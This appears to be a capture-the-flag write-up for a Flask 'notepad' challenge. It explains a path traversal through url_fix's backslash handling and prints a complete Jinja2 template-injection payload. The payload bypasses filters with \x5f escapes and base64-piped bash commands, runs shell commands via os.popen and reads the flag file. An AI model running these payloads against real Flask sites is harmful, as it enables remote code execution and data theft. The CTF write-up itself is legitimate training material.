# notepad
## RECON

This challenges give you a web that
* Receives `content` from the user
* writes it as an HTML file in the `static/` directory, and redirects to that file

<img width="337" height="172" alt="image" src="https://github.com/user-attachments/assets/ee8af4b9-c51a-4fec-ae6d-89c70bc26fc0" />

<img width="562" height="117" alt="image" src="https://github.com/user-attachments/assets/25e75dd6-bb27-489a-b780-a0794d516a9a" />

on source code app.py
```python
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```
what this code do ?
web recieve content from user input
```python
content = request.form.get("content", "")
```
filters "_" and "/" from input then render index.html page where error="bad_content"
```python
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
```
if string is longer than 512 render index.html page where error="bad_content"
```python
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
```
then redirect to /static "url_fix" take first 128 character to filename change content to correct url and end with random 8 character

**note** url_fix will change " \ " to " / "
```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```
this is index.html in source code

<img width="650" height="301" alt="image" src="https://github.com/user-attachments/assets/1a4fa4f5-4cb2-4982-93fb-6ac71911c8a8" />

on **{{ error }}** there's is nothing we can do it completely escaped

but **{% include "errors/" + error + ".html" ignore missing %} {% endif %}** this take ```error``` directly in path render it as html

we need to make content input to here so

# PLAN
1.find a way to make input appear on ```error``` template

2.craft a payload that bypass filter "_" and " / " and put it after 128 character

# TEST
* make payload appear on error page

payload --> ```..\templates\errors\test```

<img width="553" height="263" alt="image" src="https://github.com/user-attachments/assets/8d7dbe3a-e62b-4aa9-98c4-61af96ad05d0" />

```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```
when source code put our payoad in it will look like this

```static/../templates/errors/test-<token>.html```

when resolve on real disk it will look like this

```/app/templates/errors/test-<token>.html```

which mean we have our templates on ```\test-<token>.html```

but we need to make it furthur than 128 character to make sure our script is not on file name 

so we test on --> ```..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\test{{7*7}}```

<img width="838" height="287" alt="image" src="https://github.com/user-attachments/assets/52d01b5a-7ea7-4982-b352-c599f5a9a6cf" />

and that work very well

so now we need to craft our payload, command before bypass is 

```{{ request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("ls /app")["read"]() }}```

which mean

```{{ ... }}```

in jinja is to execute everything inside {{ ... }} and show output on screen

```request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("ls /app")["read"]()```

application is a flask app object that has function in it and every function has ```__globals__``` then get to ```__builtins__``` that contain every python function and then we import os and run ls /app by popen in shell to see every file in /app and read it out to string as an output

next we need to bypass filter "_" with "\x5f" and " / " with " \ " problems is  "ls /app" we need to bypass " / " with encode it to base64 

"bHMgL2FwcA==" and command we run ```echo -n bHMgL2FwcA== | base64 -d | bash``` send bHMgL2FwcA== into base64 decode and then run in sehll

our final payload is

```..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\test {{ request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n bHMgL2FwcA== | base64 -d | bash")["read"]() }}```

and we get output like this

<img width="1391" height="281" alt="image" src="https://github.com/user-attachments/assets/48b0c59f-9382-456b-8c7c-4d2038cf3da1" />

and we change command to from "ls /app" to "cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt"

<img width="1263" height="250" alt="image" src="https://github.com/user-attachments/assets/35e82cc8-d243-49ba-983f-d171224f28ea" />





